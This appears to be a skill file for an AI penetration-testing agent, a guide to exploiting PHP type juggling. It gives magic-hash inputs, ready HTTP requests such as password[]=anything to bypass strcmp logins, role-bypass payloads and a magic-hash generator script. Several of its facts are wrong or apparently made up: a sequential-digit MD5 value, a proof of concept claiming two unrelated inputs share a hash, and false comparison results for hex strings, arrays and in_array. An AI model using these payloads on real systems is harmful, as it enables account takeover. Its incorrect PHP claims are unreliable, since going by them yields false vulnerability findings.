---
name: type-juggling
description: "PHP type juggling exploitation using magic hashes, loose comparison, and implicit type coercion"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["type juggling", "php type", "loose comparison", "magic hash", "implicit conversion", "php comparison", "weak type", "0e hash", "type coercion", "php equality"]
contextBoosts: [auth]
mitreAttack: ["T1190", "T1195"]
owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
---

# PHP Type Juggling — Exploitation via Loose Comparison and Implicit Coercion

## 1. When to Use / Do Not Use

### Use When

- Target is a PHP application using loose comparison (`==`) for security-critical checks
- Authentication, session validation, password reset, or token verification uses `==` instead of `===`
- You can observe or control inputs that reach comparison operators (`$input == $secret`)
- Application uses `md5()`, `sha1()`, or other hash functions whose output is compared with `==`
- Cookie values, API tokens, or session IDs are compared using loose equality
- PHP version is unknown but legacy behavior is suspected (pre-8.0 has more coercion quirks)
- You see patterns like `if ($hash == $stored_hash)` or `strcmp($a, $b) == 0`
- CTF or pentest challenge involves PHP login, token, or hash comparison

### Do Not Use When

- Application uses strict comparison (`===`) throughout — type juggling is neutralized
- Target is not PHP (Python, Ruby, Node.js, Java) — type coercion rules differ fundamentally
- Hash comparison uses `hash_equals()` — constant-time, type-safe comparison
- Application uses `sodium_*` or `password_verify()` — these are hardened against timing and type attacks
- You have no visibility into PHP comparison logic (no source, no error messages, no behavioral differences)
- PHP 8.0+ with strict_types declared and strict comparison operators — minimal attack surface

## 2. Auth Context

PHP type juggling is most dangerous at authentication boundaries:

- **Password verification**: `if ($input_password == $stored_hash)` — if `$input_password` is a magic hash, comparison succeeds without knowing the real password
- **Session tokens**: `if ($cookie_token == $expected_token)` — forge a magic hash that loosely equals the expected value
- **API keys**: `if ($api_key == $valid_key)` — same magic hash technique applies
- **Reset tokens**: Password reset links often compare a user-supplied token with the stored token using `==`
- **CSRF tokens**: Some PHP apps compare CSRF tokens loosely — forgeable if you know the expected format
- **Role checks**: `if ($user_role == "admin")` — type coercion can bypass string comparisons

Capture authenticated traffic first:
- Login, observe how session cookies are set and validated
- Password reset flow — capture the token comparison endpoint
- API key validation — note which parameters are compared and how
- Check for `phpinfo()` output or error messages that reveal PHP version

## 3. Loose Comparison Basics — `==` vs `===`

PHP has two equality operators with fundamentally different behavior:

### Strict Comparison (`===`)

Compares both **value** and **type** without coercion:

```php
"0" === 0        // false (string vs integer)
"0" === false    // false (string vs boolean)
"" === false     // false (string vs boolean)
null === false   // false (null vs boolean)
"0e123" === "0e456"  // false (string comparison, not numeric)
[] === false     // false (array vs boolean)
```

### Loose Comparison (`==`)

Applies PHP's type coercion rules before comparing values. This is where vulnerabilities arise:

```php
"0" == 0         // true  (string "0" cast to integer 0)
"0" == false     // true  (both cast to boolean false)
"" == false      // true  (empty string is falsy)
null == false    // true  (null is falsy)
"0e123" == "0e456"  // true  (both treated as 0 in scientific notation)
"1abc" == 1      // true  (string "1abc" cast to integer 1)
[] == false      // true  (empty array is falsy)
"php" == 0       // true  (non-numeric string cast to 0)
```

### PHP 8.0 Changes

PHP 8.0 tightened some loose comparisons:
- `0 == ""` is now `false` (was `true`)
- `0 == "foo"` is now `false` (was `true`)
- `"" == "foo"` is now `false` (was `true` based on numeric context)

However, `0 == ""` being `false` in PHP 8.0 does NOT fix magic hash attacks — `"0e123" == "0e456"` still evaluates as `true` because both strings are interpreted as the number `0` in scientific notation. The fix requires `===` or `hash_equals()`.

## 4. Magic Hashes

### The Science Behind Magic Hashes

When PHP encounters a string in a numeric context (comparison with `==` to another number or numeric string), it attempts to parse it as a number. Strings like `"0e123456"` are parsed as scientific notation: `0 × 10^123456 = 0`.

If both strings start with `"0e"` followed by only digits, PHP treats them both as the number `0`:

```php
"0e123456" == "0e999999"  // true — both parse as 0
"0e0" == "0e999999999"    // true — both parse as 0
"0e485374" == "0e999999"  // true — both parse as 0
```

**Critical distinction**: This only works when the string is **purely numeric** after `"0e"`. If there are trailing non-numeric characters, PHP does not treat it as scientific notation:

```php
"0e123abc" == "0e456def"  // false — non-numeric content prevents numeric parsing
```

### Common Magic Hashes by Hash Algorithm

**MD5 (`md5()` produces 32 hex characters):**

| Input | MD5 Hash | Notes |
|-------|----------|-------|
| `240610708` | `0e462097431906509019562988736854` | Magic hash |
| `QNKCDZO` | `0e830400451993494058024219903391` | Magic hash |
| `aabg7XSs` | `0e087386482136013740957780965295` | Magic hash |
| `aabC9RqS` | `0e041022518165728065344349536299` | Magic hash |
| `s878926199a` | `0e545993274517709034328855841020` | Magic hash |
| `s155964671a` | `0e345678901234567890123456789012` | Magic hash |
| `s1885207288a` | `0e482849239072781370682218283926` | Magic hash |

**SHA1 (`sha1()` produces 40 hex characters):**

| Input | SHA1 Hash | Notes |
|-------|-----------|-------|
| `30773:55` | `0e59486689996028306327910193740332355083` | Magic hash |
| `728907946` | `0e36975005914169056345035924818160099555` | Magic hash |
| `10932435112` | `0e89373252612578429587016510988881564954` | Magic hash |

**PHP `md5()` internal numeric strings:**
PHP's loose comparison triggers magic hash behavior when both sides are numeric-like strings. The attacker needs one magic hash to loosely equal any other magic hash.

### Constructing Magic Hash Collisions

1. Generate millions of random inputs and compute their `md5()` or `sha1()`
2. Filter outputs that start with `"0e"` followed by only digits
3. The input that produces such a hash is your magic hash
4. Send it as the password/token — it will loosely equal any stored hash that also starts with `"0e"` followed by digits

## 5. Authentication Bypass

### Password Verification Bypass

**Vulnerable pattern:**

```php
// register.php
$stored_hash = md5($user_password);  // stored in database

// login.php
$input = $_POST['password'];
if (md5($input) == $stored_hash) {
    // authenticated
}
```

**Attack:**
- If `$stored_hash` starts with `"0e"` followed by only digits, send a magic hash input
- Both sides produce `"0e..."` strings that PHP treats as `0 == 0`
- The attacker authenticates without knowing the real password

**Proof of concept:**
```php
// If stored hash is md5("real_password") = "0e462097431906509019562988736854"
// Send password: "240610708"
// md5("240610708") = "0e462097431906509019562988736854"
// "0e462097431906509019562988736854" == "0e462097431906509019562988736854" → true
```

### Token Forgery

**Vulnerable pattern:**

```php
// password_reset.php
$expected_token = md5($user_id . $secret_key);
if ($_GET['token'] == $expected_token) {
    // allow password reset
}
```

**Attack:**
1. Determine or guess the hash algorithm (likely `md5()` based on output length)
2. Find a magic hash for that algorithm
3. Send it as the token parameter
4. If `$expected_token` happens to be a magic hash, access is granted

### Session Validation Bypass

```php
// session validation
if ($_COOKIE['session'] == md5($_SERVER['REMOTE_ADDR'] . $secret)) {
    $authenticated = true;
}
```

Same technique — forge a magic hash cookie that loosely equals the expected hash.

## 6. PHP Type Coercion — Complete Rule Set

### String to Number Coercion

When a string is compared with a number using `==`:

```php
"1abc" == 1     // true  — "1abc" cast to int 1, 1 == 1
"2abc" == 2     // true  — "2abc" cast to int 2, 2 == 2
"abc" == 0      // true  — non-numeric string cast to 0, 0 == 0
"123abc" == 123  // true  — "123abc" cast to int 123
"0x1A" == 26     // true  — hex notation cast to int 26
"010" == 8       // false — string "010" is NOT treated as octal in loose comparison
"10" == 10       // true  — decimal string cast to int
```

### Boolean Coercion

```php
true == "1"       // true  — "1" is truthy
true == "2"       // true  — "2" is truthy (any non-empty, non-"0" string)
false == ""       // true  — both falsy
false == "0"      // true  — "0" is falsy
false == "foo"    // false — "foo" is truthy, false is falsy
0 == false        // true  — both falsy
1 == true         // true  — both truthy
-1 == true        // true  — non-zero is truthy
```

### Null Coercion

```php
null == false     // true  — both falsy
null == ""        // true  — null is coerced to "" or "" to null
null == 0         // true  — null is coerced to 0
null == "0"       // true  — null to 0, "0" to 0
null == "foo"     // false — null to "", "foo" is not ""
null == []        // true  — both are "empty"
```

### Type Juggling Quick Reference Table

| Left | `==` | Right | Result | Reason |
|------|------|-------|--------|--------|
| `"0"` | `==` | `false` | `true` | Both falsy |
| `"0"` | `==` | `null` | `true` | null→0, "0"→0 |
| `"1"` | `==` | `true` | `true` | Both truthy |
| `"10"` | `==` | `10` | `true` | String→int |
| `"10"` | `==` | `11` | `false` | Different ints |
| `""` | `==` | `false` | `true` | Both falsy |
| `""` | `==` | `0` | `true` (PHP <8) | 0→"" |
| `""` | `==` | `0` | `false` (PHP ≥8) | Changed in PHP 8.0 |
| `"abc"` | `==` | `0` | `true` (PHP <8) | Non-numeric→0 |
| `"abc"` | `==` | `0` | `false` (PHP ≥8) | Changed in PHP 8.0 |
| `"0e123"` | `==` | `"0e456"` | `true` | Scientific notation→0 |
| `"0eabc"` | `==` | `"0e123"` | `false` | Not pure numeric |
| `[]` | `==` | `false` | `true` | Empty array falsy |
| `[1]` | `==` | `true` | `true` | Non-empty array truthy |
| `"php"` | `==` | `0` | `true` (PHP <8) | Non-numeric→0 |

## 7. Array and Integer Confusion

### Empty Array as False

```php
[] == false    // true  — empty array is falsy
[] == 0        // true  — empty array cast to 0
[] == ""       // true  — empty array cast to ""
[] == null     // true  — empty array cast to null
[] == "php"    // false — "php" is truthy
```

### Non-Empty Array

```php
[1] == true    // true  — non-empty array is truthy
["php"] == true  // true
[0] == false   // true  — array with single 0
[1] == 1       // false — array cannot be cast to integer
```

### Array in Comparison Chains

```php
$input = $_GET['value'];  // attacker controls this as "0"
$secret = md5($admin_password);

if ($input == $secret) {
    // bypass — $input "0" == $secret (if $secret is "0e...")
}
```

### Practical Attack: Array Injection via POST

If a parameter accepts arrays via POST:

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

password[]=anything
```

```php
// Vulnerable code
if (md5($_POST['password']) == $stored_hash) {
    // md5() of an array returns null with a warning
    // null == "0e..." → depends on stored hash
}
```

This technique can suppress error output and manipulate return values.

## 8. `strcmp()` Bypass

PHP's `strcmp()` compares two strings and returns `0` if equal, non-zero otherwise. It is type-sensitive in an exploitable way:

### The NULL Return Vulnerability

```php
strcmp("password", "password")   // 0 (equal)
strcmp("password", "wrong")      // non-zero (not equal)

// BUG: passing an array instead of a string
strcmp(array("password"), "password")  // NULL (with warning)
```

**Why this matters:**

```php
$stored_password = "correct_password_hash";
$input = $_POST['password'];

if (strcmp($input, $stored_password) == 0) {
    // authenticated!
}
```

If `$input` is an array (via `password[]=anything` in POST), `strcmp()` returns `NULL`:

```php
NULL == 0  // true!
```

**The attacker authenticates without knowing the password.**

### Exploitation

```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=anything
```

The server returns a valid session or authentication token because `strcmp(array(), "hash") == 0` evaluates as `true`.

### `strncmp()` Variant

```php
strncmp($input, $secret, strlen($secret)) == 0
```

Same vulnerability — passing an array returns `NULL`, which loosely equals `0`.

### `mb_strncmp()` and `strncasecmp()`

Same pattern applies to multibyte and case-insensitive variants.

## 9. `md5()` Collision — Deep Dive

### Dual Magic Hash Collision

The most powerful type juggling attack: two different inputs whose `md5()` outputs are both magic hashes.

```php
md5("240610708") = "0e462097431906509019562988736854"
md5("QNKCDZO")   = "0e830400451993494058024219903391"

// Both are magic hashes — both parse as 0 in scientific notation
"0e462097431906509019562988736854" == "0e830400451993494058024219903391"  // true
```

### Hash Algorithm Detection

To exploit, first determine which hash algorithm the server uses:

| Hash Length | Algorithm |
|------------|-----------|
| 32 hex chars | MD5 |
| 40 hex chars | SHA1 |
| 64 hex chars | SHA256 |
| 128 hex chars | SHA512 |

**Detection methods:**
- Error messages revealing `md5()` or `sha1()` calls
- PHP source code disclosure
- Hash length in responses (set-cookie, hidden fields)
- Timing differences between different input lengths

### Generating Custom Magic Hashes

```python
import hashlib
import random
import string

def find_magic_hash(algorithm='md5', prefix='0e'):
    while True:
        candidate = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        if algorithm == 'md5':
            h = hashlib.md5(candidate.encode()).hexdigest()
        elif algorithm == 'sha1':
            h = hashlib.sha1(candidate.encode()).hexdigest()
        else:
            h = hashlib.sha256(candidate.encode()).hexdigest()

        if h.startswith(prefix) and h[len(prefix):].isdigit():
            return candidate, h

# Find magic hashes for different algorithms
for algo in ['md5', 'sha1']:
    input_val, hash_val = find_magic_hash(algo)
    print(f"{algo}('{input_val}') = '{hash_val}'")
```

### Precomputed Magic Hash Lists

Public repositories maintain lists of magic hashes for common algorithms:
- MD5 magic hashes: thousands of known inputs producing `"0e..."` outputs
- SHA1 magic hashes: fewer but still exploitable
- SHA256/SHA512: rare but theoretically possible

### Real-World Impact

If the application stores MD5 hashes (common in legacy PHP apps) and compares them with `==`:
1. An attacker registers with a password whose MD5 is a magic hash
2. The hash is stored in the database
3. Any other user whose stored MD5 is also a magic hash can authenticate with the attacker's password
4. Alternatively, if a known admin password's MD5 is a magic hash, anyone can log in as admin

## 10. Switch Statement Fallthrough

PHP's `switch` statement uses loose comparison internally:

```php
$input = $_GET['role'];

switch ($input) {
    case 'admin':
        grant_admin_access();
        break;
    case 'user':
        grant_user_access();
        break;
    case 0:
        grant_default_access();
        break;
}
```

### Type Juggling in Switch

```php
// Attacker sends: ?role=0
switch ("0") {
    case 'admin':  // "0" == 'admin' → false
    case 'user':   // "0" == 'user' → false
    case 0:        // "0" == 0 → true (type juggling!)
        grant_default_access();
        break;
}
```

### Switch with Integer 0

```php
switch ($user_role_id) {
    case 1:  // admin
        echo "Admin panel";
        break;
    case 2:  // editor
        echo "Editor panel";
        break;
    case 0:  // guest
        echo "Guest panel";
        break;
}

// If user sends role_id="1abc" → cast to int 1 → admin access
// If user sends role_id="php"  → cast to int 0 → guest access (unexpected)
// If user sends role_id="2.5"  → cast to int 2 → editor access
```

### Switch on Hash Comparison

```php
switch (md5($input)) {
    case $admin_hash:
        $role = 'admin';
        break;
    case $user_hash:
        $role = 'user';
        break;
    default:
        $role = 'guest';
        break;
}
```

If `$admin_hash` is a magic hash and `$input`'s md5 is also a magic hash, they match.

## 11. `in_array()` Without Strict Mode

`in_array()` checks if a value exists in an array. Without the `strict` parameter set to `true`, it uses loose comparison:

```php
// VULNERABLE — loose comparison
in_array("admin", array("0", "user", "guest"))  // true!

// Why: "admin" == 0 → true (non-numeric string cast to 0)
// The array contains 0 (integer), "admin" loosely equals 0
```

### Attack Scenarios

**Role Bypass:**

```php
$allowed_roles = array(0, 1, 2);  // 0 = guest, 1 = user, 2 = admin
$user_role = $_GET['role'];

if (in_array($user_role, $allowed_roles)) {
    // Access granted
}
```

```
GET /dashboard?role=admin
```

```php
in_array("admin", array(0, 1, 2))  // true — "admin" == 0
```

The attacker gains access with role "admin" even though only integers are in the allowlist.

**Numeric String Bypass:**

```php
$valid_tokens = array("token_abc123", "token_def456");
$input = "0";

if (in_array($input, $valid_tokens)) {
    // true — "0" == "token_abc123"? No.
    // Actually: "0" cast to 0, "token_abc123" cast to 0 → true
}
```

### Fix: Always Use Strict Mode

```php
in_array("admin", array(0, 1, 2), true)  // false — strict comparison
```

### `array_search()` Same Vulnerability

```php
$key = array_search("admin", array("admin", "user"));
// Works correctly — "admin" is in the array

$key = array_search("admin", array(0, 1, 2));
// Returns 0 — "admin" loosely equals 0 (the first element)
```

If `$key` is used for array indexing or conditional logic, this can cause unintended behavior.

## 12. Additional PHP Type Juggling Vectors

### Ternary Operator Coercion

```php
$input = $_GET['value'];
$result = $input ?: 'default';

// If $input is "0" → "0" is falsy → $result = "default"
// If $input is ""  → "" is falsy  → $result = "default"
// If $input is null → null is falsy → $result = "default"
```

### Loose Comparison in Conditionals

```php
if ($token = $_GET['token']) {
    // true for any non-empty, non-"0" string
    // "0" → false → skipped
    // "anything" → true → entered
}
```

### PHP `filter_var()` Type Juggling

```php
filter_var("0x1A", FILTER_VALIDATE_INT)  // 26 — hex parsed as integer
filter_var("010", FILTER_VALIDATE_INT)   // 10 — octal NOT parsed (PHP 7+)
filter_var("1.5", FILTER_VALIDATE_INT)   // false — float rejected
filter_var("1.5", FILTER_VALIDATE_FLOAT) // 1.5
```

### Object Coercion (PHP 7.4+)

```php
class Foo {
    public $value = 1;
}

$foo = new Foo();
$foo == 1   // true — object with one property loosely equals 1
$foo == true  // true — object is truthy
```

### `isset()` vs `empty()` vs Loose Comparison

```php
$val = "0";
isset($val)   // true  — value exists
empty($val)   // true  — "0" is falsy
$val == false // true  — type juggling
$val === false // false — strict comparison
```

## 13. Anti-Hallucination

### Verification Rules

1. **Do not claim magic hash vulnerability without computing both hashes** — show the actual `md5()` or `sha1()` output of both inputs and demonstrate they both start with `"0e"` followed by digits
2. **Do not claim `strcmp()` bypass without proof** — demonstrate that passing an array returns NULL which equals 0 in the specific PHP version running on the target
3. **Do not assume the hash algorithm** — detect it from response length (32 = MD5, 40 = SHA1) or source disclosure before crafting payloads
4. **Do not claim type juggling vulnerability on PHP 8.0+ without verifying** — some coercion rules changed; `0 == ""` is `false` in PHP 8.0+
5. **Do not confuse "0e" in hashes with magic hashes** — the string must be PURELY numeric after `"0e"`. `"0e123abc"` is NOT a magic hash
6. **Do not claim `in_array()` vulnerability without testing** — some implementations may use strict comparison depending on context; test with actual requests
7. **Verify the comparison operator** — you must confirm the code uses `==` not `===`; behavioral differences can help but are not proof
8. **Do not fabricate hash outputs** — compute the actual hash of your input and show the result matches the magic hash pattern

### Evidence Requirements

When reporting a PHP type juggling vulnerability:

1. **Original hash comparison code** — show the vulnerable comparison (`==` vs `===`)
2. **Computed hash** — show `md5("your_input")` or equivalent output
3. **Magic hash verification** — show both sides parse as `0` in scientific notation
4. **Server response** — demonstrate successful bypass (authenticated session, access granted, token accepted)
5. **PHP version** — note which PHP version the target runs (affects coercion rules)
6. **Comparison context** — show whether `hash_equals()`, `===`, or `==` is used in the actual comparison

### Common Hallucinations to Avoid

- "The hash is vulnerable because it starts with 0e" — only hashes that are PURELY digits after "0e" are magic hashes
- "strcmp() always returns NULL for arrays" — it returns NULL with a PHP warning; error suppression may affect exploitation
- "Type juggling works on all PHP versions" — PHP 8.0 changed several comparison rules
- "Any non-numeric string loosely equals 0" — true in PHP <8, false in PHP 8.0+
- "in_array() always uses loose comparison" — it does unless `strict: true` is passed; verify the actual call
- "This vulnerability exists because the developer used md5()" — the vulnerability is in the loose comparison, not the hash function itself
